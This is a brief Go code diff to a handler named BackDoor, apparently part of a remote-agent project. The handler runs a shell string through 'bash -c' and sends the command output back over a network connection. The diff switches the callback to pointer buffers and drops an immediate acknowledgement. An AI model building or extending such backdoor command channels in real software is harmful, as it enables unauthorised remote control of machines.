@@ -25,7 +25,7 @@ func (b BackDoor) Handler(ctx context.Context, packet *g.Packet, connection ifac
 		Name:    "bash",
 		Args:    []string{"-c", shell},
 		Timeout: 5 * 1000,
-		Callback: func(stdout, stderr bytes.Buffer, err error, isTimeout bool) {
+		Callback: func(stdout, stderr *bytes.Buffer, err error, isTimeout bool) {
 			pkt := g.NewPkt()
 			pkt.Id = g.BackDoor
 			stderrStr := stderr.String()
@@ -43,6 +43,4 @@ func (b BackDoor) Handler(ctx context.Context, packet *g.Packet, connection ifac
 		},
 	}
 	go cmd.Run()
-	pkt := g.ComResponse(packet.Id)
-	connection.AsyncWrite(pkt, 5*time.Second)
 }
